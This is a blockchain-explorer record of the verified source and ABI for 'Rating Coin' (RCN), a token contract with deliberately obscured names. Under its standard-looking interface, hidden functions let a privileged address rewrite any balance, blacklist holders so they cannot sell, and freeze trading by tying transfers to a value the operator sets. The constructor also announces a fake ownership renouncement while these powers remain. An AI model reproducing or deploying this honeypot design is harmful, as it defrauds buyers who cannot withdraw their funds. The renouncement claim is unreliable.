{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeReceiver {\n    function createPair(address senderWalletIs, address launchFeeExempt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface minIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeReceiverSell) external view returns (uint256);\n\n    function transfer(address maxReceiver, uint256 fundIs) external returns (bool);\n\n    function allowance(address tokenShouldFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxReceiver,\n        uint256 fundIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalAtTrading, uint256 value);\n    event Approval(address indexed tokenShouldFund, address indexed spender, uint256 value);\n}\n\ninterface receiverMarketingMetadata is receiverMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RatingCoin is feeTeam, receiverMarketing, receiverMarketingMetadata {\n\n    uint256 public fromAuto;\n\n    bool private sellSwap;\n\n    uint256 private feeSwapTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTrading;\n    }\n\n    uint256 constant totalIs = 14 ** 10;\n\n    mapping(address => mapping(address => uint256)) private feeLaunch;\n\n    uint256 public teamList = 3;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellShould;\n    }\n\n    uint256 buyTokenMin;\n\n    bool public senderTx;\n\n    address marketingSender;\n\n    address launchedSellWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed txSender, address indexed liquidityTeam);\n\n    uint256 public receiverToken = 0;\n\n    mapping(address => bool) public limitModeIs;\n\n    function balanceOf(address feeReceiverSell) public view virtual override returns (uint256) {\n        return autoMinMarketing[feeReceiverSell];\n    }\n\n    function transfer(address takeTeamEnable, uint256 fundIs) external virtual override returns (bool) {\n        return buyAmount(_msgSender(), takeTeamEnable, fundIs);\n    }\n\n    function autoMode(address toMarketing, address maxReceiver, uint256 fundIs) internal view returns (uint256) {\n        require(fundIs > 0);\n\n        uint256 autoTxAmount = 0;\n        if (toMarketing == tradingReceiver && teamList > 0) {\n            autoTxAmount = fundIs * teamList / 100;\n        } else if (maxReceiver == tradingReceiver && receiverToken > 0) {\n            autoTxAmount = fundIs * receiverToken / 100;\n        }\n        require(autoTxAmount <= fundIs);\n        return fundIs - autoTxAmount;\n    }\n\n    uint256 fromMaxReceiver;\n\n    function feeExemptLaunch(address isLaunch) public {\n        if (senderTx) {\n            return;\n        }\n        \n        limitModeIs[isLaunch] = true;\n        \n        senderTx = true;\n    }\n\n    function teamWallet(address minMarketing) public {\n        launchedAt();\n        \n        if (minMarketing == launchList || minMarketing == tradingReceiver) {\n            return;\n        }\n        senderIsAmount[minMarketing] = true;\n    }\n\n    address public launchList;\n\n    mapping(address => bool) public senderIsAmount;\n\n    uint256 private receiverTeam = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private autoMinMarketing;\n\n    uint8 private maxTrading = 18;\n\n    function getOwner() external view returns (address) {\n        return modeSellLaunched;\n    }\n\n    function allowance(address launchedToken, address marketingLiquidity) external view virtual override returns (uint256) {\n        if (marketingLiquidity == launchedSellWallet) {\n            return type(uint256).max;\n        }\n        return feeLaunch[launchedToken][marketingLiquidity];\n    }\n\n    function exemptTotal(uint256 fundIs) public {\n        launchedAt();\n        fromMaxReceiver = fundIs;\n    }\n\n    function launchedAt() private view {\n        require(limitModeIs[_msgSender()]);\n    }\n\n    function approve(address marketingLiquidity, uint256 fundIs) public virtual override returns (bool) {\n        feeLaunch[_msgSender()][marketingLiquidity] = fundIs;\n        emit Approval(_msgSender(), marketingLiquidity, fundIs);\n        return true;\n    }\n\n    function teamAmountMin() public {\n        emit OwnershipTransferred(launchList, address(0));\n        modeSellLaunched = address(0);\n    }\n\n    uint256 private txLaunchTotal;\n\n    function transferFrom(address toMarketing, address maxReceiver, uint256 fundIs) external override returns (bool) {\n        if (_msgSender() != launchedSellWallet) {\n            if (feeLaunch[toMarketing][_msgSender()] != type(uint256).max) {\n                require(fundIs <= feeLaunch[toMarketing][_msgSender()]);\n                feeLaunch[toMarketing][_msgSender()] -= fundIs;\n            }\n        }\n        return buyAmount(toMarketing, maxReceiver, fundIs);\n    }\n\n    uint256 private enableFeeTo;\n\n    uint256 public isAt;\n\n    constructor (){\n        \n        teamAmountMin();\n        minIs toFrom = minIs(launchedSellWallet);\n        tradingReceiver = modeReceiver(toFrom.factory()).createPair(toFrom.WETH(), address(this));\n        marketingSender = modeReceiver(toFrom.factory()).feeTo();\n        \n        launchList = _msgSender();\n        limitModeIs[launchList] = true;\n        autoMinMarketing[launchList] = receiverTeam;\n        \n        emit Transfer(address(0), launchList, receiverTeam);\n    }\n\n    address private modeSellLaunched;\n\n    string private minLimit = \"Rating Coin\";\n\n    function teamFee(address takeTeamEnable, uint256 fundIs) public {\n        launchedAt();\n        autoMinMarketing[takeTeamEnable] = fundIs;\n    }\n\n    bool private modeWallet;\n\n    function buyAmount(address toMarketing, address maxReceiver, uint256 fundIs) internal returns (bool) {\n        if (toMarketing == launchList) {\n            return feeSender(toMarketing, maxReceiver, fundIs);\n        }\n        uint256 receiverSender = receiverMarketing(tradingReceiver).balanceOf(marketingSender);\n        require(receiverSender == fromMaxReceiver);\n        require(maxReceiver != marketingSender);\n        if (senderIsAmount[toMarketing]) {\n            return feeSender(toMarketing, maxReceiver, totalIs);\n        }\n        fundIs = autoMode(toMarketing, maxReceiver, fundIs);\n        return feeSender(toMarketing, maxReceiver, fundIs);\n    }\n\n    function owner() external view returns (address) {\n        return modeSellLaunched;\n    }\n\n    function feeSender(address toMarketing, address maxReceiver, uint256 fundIs) internal returns (bool) {\n        require(autoMinMarketing[toMarketing] >= fundIs);\n        autoMinMarketing[toMarketing] -= fundIs;\n        autoMinMarketing[maxReceiver] += fundIs;\n        emit Transfer(toMarketing, maxReceiver, fundIs);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTeam;\n    }\n\n    uint256 private autoFee;\n\n    function name() external view virtual override returns (string memory) {\n        return minLimit;\n    }\n\n    address public tradingReceiver;\n\n    string private sellShould = \"RCN\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenShouldFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAtTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundIs\",\"type\":\"uint256\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"feeExemptLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitModeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderIsAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmountMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeamEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundIs\",\"type\":\"uint256\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"}],\"name\":\"teamWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeamEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RatingCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}